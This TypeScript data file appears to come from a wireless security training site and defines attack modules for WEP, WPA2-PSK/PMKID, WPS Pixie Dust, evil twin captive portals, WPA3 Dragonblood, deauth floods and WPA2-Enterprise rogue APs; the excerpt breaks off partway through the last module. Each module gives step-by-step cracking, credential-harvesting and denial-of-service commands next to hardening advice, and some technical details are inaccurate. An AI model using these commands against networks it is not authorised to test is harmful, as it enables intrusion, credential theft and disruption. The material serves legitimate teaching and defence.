export type Severity = "critical" | "high" | "medium" | "low"
export type WirelessCategory = "wep" | "wpa-personal" | "wps" | "evil-twin" | "wpa3" | "deauth" | "enterprise"

export interface WirelessModule {
  slug: string
  title: string
  category: WirelessCategory
  difficulty: "easy" | "medium" | "hard"
  overview: string
  overviewNote?: string
  requirements: string[]
  recon: { tool: string; command: string; note?: string }[]
  attackSteps: { title: string; steps: string[]; tools?: string[] }[]
  vulnerabilities?: { cve?: string; title: string; description: string; severity: Severity; sourceUrl?: string }[]
  tools: string[]
  hardening: { title: string; description: string }[]
  relatedModules: string[]
}

export const categoryMeta: Record<WirelessCategory, { label: string; description: string }> = {
  wep: { label: "WEP", description: "Legacy WEP cracking — deprecated but still found on legacy APs" },
  "wpa-personal": { label: "WPA/WPA2-PSK", description: "Handshake capture + PMKID attack + dictionary cracking" },
  wps: { label: "WPS", description: "WPS PIN brute force and Pixie Dust attacks" },
  "evil-twin": { label: "Evil Twin", description: "Rogue AP with captive portal credential harvesting" },
  wpa3: { label: "WPA3", description: "Dragonblood side-channel attacks and SAE downgrade" },
  deauth: { label: "Deauthentication", description: "Deauth flooding for handshake capture and DoS" },
  enterprise: { label: "Enterprise/WPA2-Enterprise", description: "EAP relay and RADIUS credential harvesting" },
}

export const wirelessModules: WirelessModule[] = [
  {
    slug: "wpa2-psk",
    title: "WPA/WPA2-PSK Handshake & PMKID Attack",
    category: "wpa-personal",
    difficulty: "medium",
    overview: "WPA/WPA2-PSK (Pre-Shared Key) is the dominant Wi-Fi security mode for home and small office networks. The PSK is derived from the SSID and passphrase. There are two distinct attack paths to recover the PSK: (1) the classic 4-way handshake capture, which requires an active client and a deauthentication flood to force reconnection, and (2) the PMKID attack, which exploits APs that embed the PMKID in the first EAPOL frame — no client required. PMKID is strictly superior: it works on any AP with WPS enabled or certain RSN IE implementations, requires no client interaction, and produces results in seconds instead of minutes. Always attempt PMKID first before resorting to handshake capture.",
    overviewNote: "PMKID attack does not require a connected client — you can capture the hash with just the AP's beacon. The 4-way handshake method requires an active client and a deauth flood. PMKID is strictly superior: try it first, always.",
    requirements: [
      "Wireless adapter supporting monitor mode (e.g. Alfa AWUS036ACH, internal Intel AX200)",
      "Kali Linux or Parrot OS with aircrack-ng suite installed",
      "hcxdumptool + hcxtools for PMKID attack (the preferred method)",
      "hashcat for GPU-accelerated cracking (mode 22000 for PMKID, mode 22001 for handshake)",
      "Wordlist: rockyou.txt, or a custom wordlist with rules for faster cracking",
    ],
    recon: [
      { tool: "airmon-ng", command: "airmon-ng check kill", note: "Kill conflicting network services (NetworkManager, wpa_supplicant)" },
      { tool: "airmon-ng", command: "airmon-ng start wlan0", note: "Enable monitor mode on wireless interface" },
      { tool: "airodump-ng", command: "airodump-ng wlan0mon", note: "Scan for nearby APs — note BSSID, channel, channel width, and encryption type (CCMP/TKIP)" },
      { tool: "airodump-ng", command: "airodump-ng --bssid <target_bssid> -c <channel> -w capture wlan0mon", note: "Targeted capture on the target's channel — writes packets to capture-XX.cap" },
    ],
    attackSteps: [
      {
        title: "Attack Path A — 4-Way Handshake Capture (requires client)",
        steps: [
          "airodump-ng --bssid <target_bssid> -c <channel> -w capture wlan0mon",
          "aireplay-ng --deauth 5 -a <target_bssid> wlan0mon",
          "Wait for a client to reconnect automatically — airodump-ng displays '[WPA handshake: <bssid>]' in the top-right corner",
          "Handshake is saved to capture-01.cap — stop airodump-ng with Ctrl+C",
          "To verify the capture contains a handshake: aircrack-ng capture-01.cap | Select-String '1 handshake'",
        ],
        tools: ["airodump-ng", "aireplay-ng"],
      },
      {
        title: "Attack Path B — PMKID Capture (no client, preferred)",
        steps: [
          "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
          "If the AP supports PMKID broadcast, it is captured in the first EAPOL frame — no deauth or client wait needed",
          "Press Ctrl+C after 10-30 seconds — if PMKID is present, it is already captured",
          "PMKID does not require a client to be connected. Try this first — it is faster and simpler than the handshake method",
        ],
        tools: ["hcxdumptool"],
      },
      {
        title: "Convert Captures to Hashcat Format",
        steps: [
          "For PMKID (.pcapng): hcxpcapngtool -o hash.hc22000 capture.pcapng",
          "For handshake (.cap): hcxpcapngtool -o hash.hc22000 capture-01.cap",
          "The .hc22000 file contains hashes for both PMKID (mode 22000) and handshake (mode 22001) — hashcat auto-detects",
          "Legacy method: cap2hccapx capture-01.cap hash.hccapx && hashcat -m 2500 hash.hccapx rockyou.txt",
        ],
        tools: ["hcxpcapngtool", "hcxtools", "cap2hccapx"],
      },
      {
        title: "Crack with hashcat (GPU, recommended)",
        steps: [
          "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
          "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
          "hashcat -m 22000 hash.hc22000 custom_wordlist.txt — for targeted wordlists",
          "Monitoring: hashcat -m 22000 hash.hc22000 rockyou.txt --show — shows cracked passwords",
        ],
        tools: ["hashcat"],
      },
      {
        title: "Crack with aircrack-ng (CPU, slower alternative)",
        steps: [
          "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <target_bssid> capture-01.cap",
          "aircrack-ng -w custom_list.txt -b <target_bssid> capture-01.cap",
          "CPU cracking is significantly slower than GPU with hashcat — only use if hashcat is unavailable",
        ],
        tools: ["aircrack-ng"],
      },
    ],
    tools: ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "hcxdumptool", "hcxtools", "hcxpcapngtool", "hashcat", "cap2hccapx"],
    hardening: [
      { title: "Use a 16+ Character Random Passphrase", description: "A long passphrase (16+ characters) with mixed case, numbers, and symbols dramatically increases the cracking time. Avoid dictionary words, dates, patterns, or common phrases." },
      { title: "Disable WPS on the AP", description: "WPS PIN bypasses WPA2-PSK security entirely. If WPS is enabled, the PIN can be brute-forced in hours, revealing the PSK regardless of passphrase strength. Disable WPS in the AP admin panel." },
      { title: "Upgrade to WPA3-SAE", description: "WPA3-SAE replaces the 4-way handshake with SAE (Simultaneous Authentication of Equals), which is resistant to offline dictionary attacks. Migrate if your hardware supports it." },
      { title: "Disable PMKID Broadcast", description: "Some APs allow disabling PMKID in beacon/RSN IE frames. Check your AP vendor settings — not all APs expose this option." },
      { title: "Enable 802.11w (Management Frame Protection)", description: "MFP prevents deauth-based handshake capture by cryptographically protecting management frames. WPA3 mandates MFP; WPA2 APs may support it as an optional setting." },
    ],
    relatedModules: ["wps-attacks", "deauth-attacks", "wpa3-dragonblood"],
  },
  {
    slug: "wps-attacks",
    title: "WPS PIN Attack & Pixie Dust",
    category: "wps",
    difficulty: "easy",
    overview: "Wi-Fi Protected Setup (WPS) was designed to simplify connecting devices to a Wi-Fi network using an 8-digit PIN. The PIN is divided into two halves — the first 4 digits are validated independently by the AP, and the last digit is a checksum. This design flaw reduces the effective search space from 100 million to just 11,000 possible PIN combinations (10^4 for the first half + 10^3 for the second half). A standard brute-force attack takes 4-10 hours at 1 PIN/second. The Pixie Dust attack exploits weak random number generation in the AP's E-Nonce/S-Nonce computation — many Ralink, Realtek, Broadcom, and Atheros chipsets are vulnerable. Pixie Dust recovers the PIN in seconds to minutes instead of hours. If WPS is enabled, the WPA2-PSK passphrase is recoverable regardless of its complexity. WPS is the single most dangerous feature to leave enabled on any AP.",
    overviewNote: "The WPS PIN design flaw reduces brute-force from 100 million to only 11,000 guesses — the first 4 digits are verified separately from the last 3 digits + checksum. Pixie Dust exploits weak AP random number generation and recovers the PIN in seconds. If WPS is enabled, the WPA2 password is compromised regardless of complexity.",
    requirements: [
      "Wireless adapter with monitor mode and packet injection (Atheros chipset recommended for best compatibility)",
      "wash utility (part of the reaver package) for WPS discovery",
      "reaver-wps-fork-t6x (the actively maintained fork of reaver) for PIN brute force and Pixie Dust",
      "bully — alternative WPS tool that works on some APs where reaver fails (e.g., locked APs with rate limiting)",
      "Kali Linux or Parrot OS (all tools pre-installed under kali-linux-wireless)",
    ],
    recon: [
      { tool: "airmon-ng", command: "airmon-ng start wlan0", note: "Enable monitor mode on the wireless interface" },
      { tool: "wash", command: "wash -i wlan0mon -C", note: "List all WPS-enabled APs — shows BSSID, channel, WPS version, locked status, and manufacturer. The -C flag ignores signal strength (shows all APs)" },
      { tool: "airodump-ng", command: "airodump-ng wlan0mon", note: "Verify target AP BSSID, channel, and encryption type" },
      { tool: "wash", command: "wash -i wlan0mon -b <target_bssid> -C", note: "Isolate a specific AP to check its WPS state (locked vs unlocked) and WPS version" },
    ],
    attackSteps: [
      {
        title: "Attack Path A — Standard WPS PIN Brute Force",
        steps: [
          "reaver -i wlan0mon -b <target_bssid> -vv",
          "Reaver attempts PINs sequentially — first half (4 digits, 0000-9999), then second half (3 digits, 000-999 + checksum)",
          "Average time: 4-10 hours at ~1 PIN/second (depends on AP response speed and distance)",
          "Monitor with verbose output (-vv) — shows current PIN being tested and estimated time remaining",
          "If the AP locks WPS after failed attempts (some lock after 5-10 failures), wait 30-60 minutes or reboot the AP with physical access to unlock",
        ],
        tools: ["reaver"],
      },
      {
        title: "Attack Path B — Pixie Dust (seconds, preferred)",
        steps: [
          "reaver -i wlan0mon -b <target_bssid> -K 1 -vv",
          "The -K 1 flag enables Pixie Dust attack — exploits weak RNG in the AP's E-Nonce and S-Nonce generation",
          "If the AP chipset is vulnerable (Ralink, Realtek, Broadcom, Atheros), the WPS PIN is recovered in seconds to minutes",
          "Once PIN is recovered, reaver displays the WPA PSK passphrase immediately",
          "Pixie Dust is non-destructive — it reads the nonces passively without writing PINs, so it won't trigger WPS lockout",
          "Always attempt Pixie Dust first. If it fails (AP is not vulnerable), fall back to standard brute force",
        ],
        tools: ["reaver"],
      },
      {
        title: "Bully (alternative, handles locked APs better)",
        steps: [
          "bully -i wlan0mon -b <target_bssid> -v 2",
          "Bully uses a different WPS negotiation approach and often works on APs where reaver fails",
          "Bully -F -b <target_bssid> -i wlan0mon — the -F flag forces use of random MAC to bypass per-MAC rate limiting",
          "bully -i wlan0mon -b <target_bssid> -v 2 -L — the -L flag prevents lockout by pausing between PIN attempts",
        ],
        tools: ["bully"],
      },
      {
        title: "WPS Locked State — Bypass Techniques",
        steps: [
          "If reaver reports '[!] WPS transaction failed (code: 0x04)' — the AP is locked or the PIN is exhausted",
          "Option 1: Wait 30-60 minutes — some APs auto-unlock after a cooldown period",
          "Option 2: Reboot the AP remotely (if you have admin access) or physically (power cycle)",
          "Option 3: Use bully with the -L flag (slow rate + random MAC rotation) to avoid triggering lockout in the first place",
          "Option 4: Target a different WPS-enabled AP — some vendors have shorter or no lockout periods",
        ],
        tools: ["reaver", "bully"],
      },
    ],
    tools: ["reaver", "bully", "wash", "airmon-ng", "airodump-ng", "macchanger"],
    hardening: [
      { title: "Disable WPS Completely", description: "Access your AP settings and disable WPS entirely. This is the single most effective hardening step in the entire wireless section. If your AP does not offer a WPS disable option, replace it immediately." },
      { title: "Use WPA3-Only Mode", description: "WPA3 does not include WPS. Migrating to WPA3 eliminates the entire WPS attack surface. If WPA3 is available on your hardware, enable it and disable WPA2 fallback." },
      { title: "Update AP Firmware", description: "Vendor firmware updates may patch weak RNG implementations that enable Pixie Dust attacks. Some vendors (e.g., OpenWrt, DD-WRT) have backported fixes." },
      { title: "Use a Separate IoT VLAN", description: "If some devices (printers, smart TVs, IoT hubs) require WPS, place them on an isolated VLAN with no access to sensitive internal networks. This limits the blast radius of a WPS compromise." },
      { title: "Disable WPS After Initial Setup", description: "If WPS is needed for initial device provisioning (e.g., IoT onboarding), disable it immediately after all devices are connected. Some APs support 'push-button' WPS which is safer than PIN WPS." },
    ],
    relatedModules: ["wpa2-psk", "deauth-attacks"],
  },
  {
    slug: "wep",
    title: "WEP Cracking (FMS, KoreK & PTW)",
    category: "wep",
    difficulty: "easy",
    overview: "Wired Equivalent Privacy (WEP) is a deprecated wireless security protocol that uses the RC4 stream cipher with a 24-bit Initialization Vector (IV). The small IV space (16.7 million values) guarantees IV reuse under heavy traffic. Statistical attacks — FMS (Fluhrer-Mantin-Shamir), KoreK, and PTW (Pyshkin-Tews-Weinmann) — can recover the WEP key by collecting a sufficient number of unique IVs. PTW is the fastest, requiring as few as 20,000 IVs. ARP Replay injection accelerates IV collection on quiet networks. WEP remains on legacy industrial, hospitality, and IoT bridge equipment despite being deprecated in 2004.",
    requirements: [
      "Wireless adapter supporting monitor mode and packet injection (e.g. Alfa AWUS036ACH, Atheros chipset)",
      "Kali Linux or Parrot OS with aircrack-ng suite installed",
      "Target AP broadcasting WEP (Open System or Shared Key authentication)",
    ],
    recon: [
      { tool: "airmon-ng", command: "airmon-ng check kill", note: "Kill conflicting network services" },
      { tool: "airmon-ng", command: "airmon-ng start wlan0", note: "Enable monitor mode" },
      { tool: "airodump-ng", command: "airodump-ng wlan0mon", note: "Scan for WEP APs — look for 'WEP' under ENC column" },
      { tool: "airodump-ng", command: "airodump-ng --bssid <target_bssid> -c <channel> -w capture wlan0mon", note: "Targeted capture on the WEP AP channel" },
    ],
    attackSteps: [
      {
        title: "PTW Attack (fastest, ~20k IVs)",
        steps: [
          "airodump-ng --bssid <target_bssid> -c <channel> -w capture wlan0mon",
          "aircrack-ng -a 1 -b <target_bssid> capture-01.cap",
          "PTW is the default attack in aircrack-ng — it runs automatically and usually succeeds with 20k-40k unique IVs",
          "If the key is 128-bit (26 hex chars), more IVs may be needed",
        ],
        tools: ["aircrack-ng", "airodump-ng"],
      },
      {
        title: "ARP Replay Injection (accelerate IV capture)",
        steps: [
          "aireplay-ng --arpreplay -b <target_bssid> -h <client_mac> wlan0mon",
          "Wait for an ARP packet from a client — aireplay-ng captures and re-injects it repeatedly",
          "Each re-injection triggers a new encrypted response from the AP, generating fresh IVs",
          "Watch IV count in the airodump-ng statistics (upper-right corner of the terminal)",
          "Once you have 40k+ IVs, run aircrack-ng --bssid <target_bssid> capture-01.cap",
        ],
        tools: ["aireplay-ng", "aircrack-ng"],
      },
      {
        title: "FMS + KoreK Attack (legacy, larger IV sets)",
        steps: [
          "Collect 250,000+ IVs via airodump-ng (or ARP replay for speed)",
          "aircrack-ng -K -b <target_bssid> capture-01.cap",
          "The -K flag forces KoreK attack instead of PTW — useful when PTW fails on certain APs",
          "FMS attack runs automatically alongside KoreK in aircrack-ng",
        ],
        tools: ["aircrack-ng"],
      },
      {
        title: "WEP Shared Key Authentication Bypass",
        steps: [
          "airodump-ng --bssid <target_bssid> -c <channel> -w capture wlan0mon",
          "aireplay-ng --fakeauth 0 -o 1 -e <ssid> -a <target_bssid> -h <attacker_mac> wlan0mon",
          "If the AP uses Shared Key authentication, aireplay-ng captures the challenge-response and associates",
          "Once associated, proceed with ARP Replay and PTW as above",
        ],
        tools: ["aireplay-ng", "aircrack-ng"],
      },
    ],
    tools: ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "packetforge-ng"],
    hardening: [
      { title: "Upgrade to WPA2/WPA3 Immediately", description: "WEP provides no real security. Any WEP-protected network should be migrated to WPA2-PSK (AES) or WPA3-SAE. Hardware that only supports WEP must be replaced." },
      { title: "Use 802.1X with Dynamic WEP", description: "If WEP is absolutely unavoidable (legacy industrial equipment), use 802.1X authentication with per-session dynamic WEP keys. This limits the window for IV collection to each session." },
      { title: "Replace Legacy Equipment", description: "WEP-only devices (pre-2006 access points, embedded systems) cannot be secured. Isolate them on a separate VLAN with no access to production networks and plan replacement." },
      { title: "Monitor for ARP Injection", description: "WIDS/WIPS systems can detect anomalous ARP replay rates. Tools like Kismet and Wireshark can flag high volumes of identical replayed packets." },
    ],
    relatedModules: ["wpa2-psk", "deauth-attacks"],
  },
  {
    slug: "evil-twin",
    title: "Evil Twin Attack & Captive Portal",
    category: "evil-twin",
    difficulty: "medium",
    overview: "An Evil Twin attack sets up a rogue access point broadcasting the same SSID as a legitimate network. Victims connecting to the rogue AP route traffic through the attacker's machine, enabling credential harvesting (via captive portal), traffic sniffing, and session hijacking. The attack is often paired with a deauthentication flood to force clients off the legitimate AP and onto the rogue one. Modern tools like airgeddon, fluxion, and bettercap automate the entire workflow including captive portal templates for major ISPs and social networks.",
    overviewNote: "Wi-Fi clients have no way to cryptographically verify an AP's identity — any device can broadcast any SSID. This is a fundamental 802.11 design limitation. Always pair Evil Twin with a deauth flood to force clients off the legitimate AP and onto your rogue one.",
    requirements: [
      "Two wireless adapters recommended — one for AP mode (hostapd), one for monitor/deauth (aireplay-ng)",
      "hostapd and dnsmasq installed",
      "Web server for captive portal (Python http.server or bundled templates in airgeddon/fluxion)",
      "Captive portal template (or use automated tools like fluxion/airgeddon)",
    ],
    recon: [
      { tool: "airodump-ng", command: "airodump-ng wlan0mon", note: "Identify target AP SSID, BSSID, channel, and connected client count" },
      { tool: "airodump-ng", command: "airodump-ng --bssid <target_bssid> -c <channel> wlan0mon", note: "Monitor client activity on the target channel" },
    ],
    attackSteps: [
      {
        title: "Manual Evil Twin Setup (hostapd + dnsmasq)",
        steps: [
          "Configure hostapd: create /etc/hostapd/evil-twin.conf with the target SSID, channel, and wlan0-AP interface",
          "Configure dnsmasq: /etc/dnsmasq.conf with DHCP range 192.168.1.2-100, gateway 192.168.1.1, DNS forwarding",
          "Start dnsmasq: dnsmasq -C /etc/dnsmasq.conf -d",
          "Start hostapd: hostapd /etc/hostapd/evil-twin.conf",
          "Assign IP: ifconfig wlan0-AP 192.168.1.1 netmask 255.255.255.0",
          "Start captive portal: python3 -m http.server 80 --directory /path/to/portal",
          "Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward",
          "Configure NAT: iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
        ],
        tools: ["hostapd", "dnsmasq", "iptables"],
      },
      {
        title: "Deauth Clients from Legitimate AP",
        steps: [
          "aireplay-ng --deauth 10 -a <target_bssid> wlan0mon",
          "Targeted at specific MAC: aireplay-ng --deauth 5 -a <target_bssid> -c <client_mac> wlan0mon",
          "Clients that reconnect will prefer the rogue AP if it has a stronger signal",
        ],
        tools: ["aireplay-ng"],
      },
      {
        title: "Automated Attack with airgeddon",
        steps: [
          "git clone https://github.com/v1s1t0r1sh3r3/airgeddon && cd airgeddon",
          "sudo bash airgeddon.sh",
          "Select interface → choose 'Evil Twin' attack → select AP mode → choose target",
          "Select captive portal template (Google, Facebook, generic, etc.)",
          "airgeddon handles hostapd, dnsmasq, deauth, and portal deployment automatically",
          "Captured credentials are saved to airgeddon/captured_credentials.txt",
        ],
        tools: ["airgeddon"],
      },
      {
        title: "Bettercap Evil Twin (with HTTP/HTTPS proxy)",
        steps: [
          "bettercap -eval \"set wifi.ap.ssid <target_ssid>; set wifi.ap.channel <channel>; wifi.ap; wifi.recon on\"",
          "Enable captive portal: http.proxy on; set http.proxy.script /path/to/capture.js",
          "Captured credentials appear in the bettercap session log",
        ],
        tools: ["bettercap"],
      },
    ],
    tools: ["hostapd", "dnsmasq", "airgeddon", "fluxion", "bettercap", "aireplay-ng", "iptables", "mitmproxy"],
    hardening: [
      { title: "Use WPA3 SAE (Mutual Authentication)", description: "WPA3-SAE provides mutual authentication between client and AP, preventing Evil Twin attacks. The client cryptographically verifies the AP's identity during association." },
      { title: "Always Verify Server Certificates", description: "For enterprise networks, configure clients to validate RADIUS server certificates. Use eduroam CAT or similar tools to deploy proper client configuration." },
      { title: "Use a VPN on Public Wi-Fi", description: "Even if connected to a legitimate AP, always tunnel traffic through a VPN. This makes Evil Twin credential harvesting and traffic sniffing ineffective." },
      { title: "Deploy WIPS/WIDS", description: "Wireless Intrusion Prevention Systems (e.g., Cisco WIPS, open-source Kismet) can detect rogue APs broadcasting the same SSID as legitimate infrastructure." },
      { title: "Remove Saved Networks", description: "Regularly clear saved Wi-Fi networks on client devices. Never connect to open or untrusted networks." },
    ],
    relatedModules: ["deauth-attacks", "enterprise", "wpa2-psk"],
  },
  {
    slug: "wpa3-dragonblood",
    title: "WPA3 Dragonblood Attacks",
    category: "wpa3",
    difficulty: "hard",
    overview: "WPA3 replaces the WPA2 4-way handshake with SAE (Simultaneous Authentication of Equals), based on the Dragonfly key exchange. The Dragonblood vulnerabilities (disclosed 2019) are a set of side-channel and protocol attacks against WPA3-SAE. These include timing attacks that leak the password (CVE-2019-9494), cache-based side-channel attacks (CVE-2019-9495), downgrade attacks via WPA3 Transition Mode (CVE-2019-9496), reflection attacks (CVE-2019-9497), and invalid curve attacks (CVE-2019-9498/9499). WPA3 Transition Mode — which accepts both WPA2 and WPA3 clients — is particularly dangerous as it allows an attacker to force clients into the weaker WPA2 handshake.",
    overviewNote: "WPA3 Transition Mode is the single biggest WPA3 risk — it accepts both WPA2 and WPA3 clients, allowing an attacker to force a downgrade to WPA2 by broadcasting a WPA2-only rogue AP. Disable Transition Mode if your hardware supports WPA3-only.",
    requirements: [
      "Python 3 with Scapy for protocol-level attacks",
      "Dragonforce tool (https://github.com/electronicwaste/Dragonforce) for automated attacks",
      "Target AP running WPA3-SAE or WPA3 Transition Mode",
      "Wireless adapter supporting monitor mode and frame injection",
      "Physical proximity to target (for timing attacks — ~2 meters recommended)",
    ],
    recon: [
      { tool: "airodump-ng", command: "airodump-ng wlan0mon", note: "Identify WPA3 networks — look for SAE in the AKM suite list (AKM type 24)" },
      { tool: "wireshark", command: "tshark -r capture.pcap -Y \"wlan.rsn.akm.type == 24\"", note: "Filter for WPA3-SAE beacon and probe response frames" },
    ],
    attackSteps: [
      {
        title: "WPA3 Transition Mode Downgrade (CVE-2019-9496)",
        steps: [
          "airodump-ng wlan0mon — identify an AP advertising both WPA2 and WPA3 in beacon frames",
          "Set up a rogue AP with the same SSID using WPA2-only (hostapd with wpa=2)",
          "aireplay-ng --deauth 5 -a <target_bssid> wlan0mon — force clients to disconnect",
          "Clients with WPA3 Transition Mode enabled will reconnect to the rogue WPA2 AP",
          "Capture the WPA2 4-way handshake and crack the passphrase offline",
        ],
        tools: ["hostapd", "aireplay-ng", "airodump-ng", "aircrack-ng"],
      },
      {
        title: "Timing Side-Channel Attack (CVE-2019-9494)",
        steps: [
          "Run Dragonforce in timing attack mode: python3 dragonforce.py --timing -i wlan0mon -b <target_bssid>",
          "The tool sends SAE commit frames and measures AP response time",
          "Timing differences reveal the password group element — iterate through candidate passwords",
          "Requires 50-500 measurement samples per candidate and close physical proximity (~2m)",
        ],
        tools: ["Dragonforce", "Scapy"],
      },
      {
        title: "Cache-Based Side-Channel (CVE-2019-9495)",
        steps: [
          "This attack targets a client rather than the AP",
          "Run a co-located process on the victim machine that monitors CPU cache timing (e.g., Flush+Reload)",
          "Monitor Dragonfly password element generation during SAE handshake",
          "Practical exploitation requires code execution on the victim — high complexity",
        ],
        tools: ["Custom exploit code", "Native client tools"],
      },
      {
        title: "SAE Reflection Attack (CVE-2019-9497)",
        steps: [
          "Capture an SAE commit frame from a legitimate client",
          "Replay the commit frame back at the same client before the AP responds",
          "This can cause the client to derive a different password element, leading to authentication failure or information disclosure",
          "Tool: Scapy script to capture, modify, and replay SAE commit frames",
        ],
        tools: ["Scapy"],
      },
      {
        title: "Invalid Curve Attack (CVE-2019-9498/9499)",
        steps: [
          "Send crafted SAE commit frames with points not on the elliptic curve",
          "Flawed implementations may accept invalid curve points, leaking bits of the password",
          "More theoretical than practical — requires a vulnerable SAE implementation",
          "Patched in most modern wpa_supplicant and hostapd versions (2019+)",
        ],
        tools: ["Scapy"],
      },
    ],
    tools: ["Dragonforce", "Scapy", "airodump-ng", "aireplay-ng", "hostapd", "aircrack-ng"],
    hardening: [
      { title: "Disable WPA3 Transition Mode", description: "Configure AP for WPA3-only mode. Transition Mode (WPA2 + WPA3 combined) is the single biggest WPA3 security risk — it enables downgrade attacks." },
      { title: "Update Firmware (hostapd/wpa_supplicant 2.8+)", description: "All Dragonblood CVEs are fixed in hostapd/wpa_supplicant 2.8 and later. Ensure your AP firmware is up to date. Home routers often lag years behind." },
      { title: "Use WPA3-Enterprise 192-bit (CNSA Level)", description: "The 192-bit security mode uses different elliptic curves and SAE parameters that are not vulnerable to Dragonblood timing attacks. Requires enterprise-grade hardware." },
      { title: "Limit Physical Access", description: "Timing attacks require close physical proximity (~2 meters). Restrict physical access to areas near WPA3 APs in sensitive environments." },
    ],
    relatedModules: ["wpa2-psk", "enterprise", "deauth-attacks"],
  },
  {
    slug: "deauth-attacks",
    title: "Deauthentication & Disassociation Attacks",
    category: "deauth",
    difficulty: "easy",
    overview: "IEEE 802.11 management frames (deauthentication and disassociation) are unauthenticated in the base 802.11 standard. An attacker can spoof deauth frames from an AP to a client (or broadcast), forcing immediate disconnection. This is a fundamental design weakness that enables: WPA handshake capture (for cracking), WPS PIN brute force (client need not be present, but deauth speeds reconnection), Evil Twin redirection (force clients to rogue AP), and network-wide DoS. 802.11w (Management Frame Protection) mitigates this, but adoption remains low — many APs and most clients do not enable it.",
    overviewNote: "802.11 management frames have no cryptographic protection. Any device within range can forge deauth frames from any MAC address. This single design weakness enables WPA handshake capture, WPS PIN attacks, Evil Twin redirection, and persistent DoS. 802.11w (MFP) fixes this, but most APs and clients do not enable it.",
    requirements: [
      "Wireless adapter with monitor mode and packet injection",
      "aircrack-ng suite (aireplay-ng for basic deauth)",
      "mdk4 for advanced deauth patterns (broadcast, SSID-based, channel hopping)",
    ],
    recon: [
      { tool: "airmon-ng", command: "airmon-ng start wlan0", note: "Enable monitor mode" },
      { tool: "airodump-ng", command: "airodump-ng wlan0mon", note: "Identify target BSSID, channel, and client MACs" },
    ],
    attackSteps: [
      {
        title: "Basic Deauth Flood (aireplay-ng)",
        steps: [
          "aireplay-ng --deauth 10 -a <target_bssid> -c <client_mac> wlan0mon",
          "Sends 10 deauth frames from AP to client — client disconnects immediately",
          "Without -c flag, sends broadcast deauth to all clients on the BSSID",
          "Increase count for persistent DoS (0 = infinite loop)",
        ],
        tools: ["aireplay-ng"],
      },
      {
        title: "Mass Deauth with mdk4",
        steps: [
          "mdk4 wlan0mon d -b /path/to/bssid_list.txt",
          "mdk4 deauth operates per-BSSID from a file — much faster than aireplay-ng for multiple APs",
          "mdk4 wlan0mon d -b blacklist.txt -c <channel>",
          "mdk4 wlan0mon d -B <target_bssid> -c <channel>",
          "Use -B for single BSSID, -b for file-based batch deauth",
        ],
        tools: ["mdk4"],
      },
      {
        title: "Deauth for WPA Handshake Capture",
        steps: [
          "airodump-ng --bssid <target_bssid> -c <channel> -w capture wlan0mon",
          "aireplay-ng --deauth 5 -a <target_bssid> wlan0mon",
          "Monitor airodump-ng output — 'WPA handshake' message confirms capture",
          "Stop airodump-ng — handshake is saved in capture-01.cap",
        ],
        tools: ["aireplay-ng", "airodump-ng"],
      },
      {
        title: "Deauth for Evil Twin Redirection",
        steps: [
          "Start rogue AP on a different channel (hostapd + dnsmasq)",
          "aireplay-ng --deauth 0 -a <target_bssid> wlan0mon",
          "Infinite deauth loop to keep clients disconnected from legitimate AP",
          "Clients scanning for the SSID will find the rogue AP and connect",
        ],
        tools: ["aireplay-ng", "hostapd", "dnsmasq"],
      },
    ],
    tools: ["aireplay-ng", "mdk4", "airodump-ng", "airmon-ng", "hostapd"],
    hardening: [
      { title: "Enable 802.11w (Management Frame Protection)", description: "802.11w adds cryptographic protection to deauth and disassociation frames. Configure your AP for '802.11w Required' (not Optional). WPA3 mandates MFP support." },
      { title: "Upgrade to WPA3", description: "WPA3 requires Management Frame Protection. Transitioning to WPA3 eliminates unauthenticated deauth attacks against protected clients." },
      { title: "Deploy WIDS/WIPS Monitoring", description: "Wireless IDS/IPS systems (e.g., Cisco WIPS, Kismet, AirMagnet) can detect anomalous deauth frame rates and alert on active deauth floods." },
      { title: "Reduce Beacon Interval and DTIM", description: "While not preventative, shorter beacon intervals help clients reconnect faster after deauth attacks, reducing practical DoS impact." },
    ],
    relatedModules: ["wpa2-psk", "wps-attacks", "evil-twin", "wpa3-dragonblood"],
  },
  {
    slug: "wpa2-enterprise",
    title: "WPA2-Enterprise EAP Relay & Credential Harvesting",
    category: "enterprise",
    difficulty: "hard",
    overview: "WPA2-Enterprise uses RADIUS-based authentication with EAP (Extensible Authentication Protocol) variants — most commonly PEAP (Protected EAP), EAP-TTLS, EAP-FAST, and EAP-TLS. The attack surface includes rogue APs that relay or capture EAP authentication exchanges. Tools like hostapd-wpe (Wireless Pawn Edition) set up a rogue AP with a built-in RADIUS server that extracts MSCHAPv2 challenge/response hashes. If the client does not validate the server certificate (the default on many devices), the attacker can present a self-signed certificate and capture the user's domain credentials. Captured hashes can be cracked offline with asleap or hashcat (mode 5500). EAP downgrade attacks force clients from TLS-based methods to weaker MSCHAPv2.",
    overviewNote: "The critical weakness is not in the protocol itself — it is that most client devices do not validate the RADIUS server certificate. If the client verifies the server cert, the rogue AP is immediately detected. Enforce certificate validation on all enterprise Wi-Fi clients.",
    requirements: [
      "Two wireless adapters — one for rogue AP (supports AP mode), one for monitoring",
      "hostapd-wpe (patched FreeRADIUS WPE) — https://github.com/OpenSecurityResearch/hostapd-wpe",
      "asleap for offline MSCHAPv2 hash cracking",
      "hashcat (mode 5500 for MSCHAPv2) for GPU-accelerated cracking",
      "Physical proximity to target enterprise network",
    ],
    recon: [
      { tool: "airodump-ng", command: "airodump-ng wlan0mon", note: "Identify enterprise networks — look for 'WPA2-Enterprise' or 'WPA2-EAP' in encryption column" },
      { tool: "airodump-ng", command: "airodump-ng --bssid <target_bssid> -c <channel> -w capture wlan0mon", note: "Targeted capture — note client count and activity patterns" },
    ],
    attackSteps: [
      {
        title: "Rogue AP with hostapd-wpe",
        steps: [
          "git clone https://github.com/OpenSecurityResearch/hostapd-wpe && cd hostapd-wpe",
          "cd hostapd-wpe/certs && ./bootstrap — generates self-signed certificate and key",
          "Edit hostapd-wpe.conf: set ssid=<target_ssid>, interface=wlan0-AP, channel=<channel>",
          "Run hostapd-wpe: ./hostapd-wpe hostapd-wpe.conf",
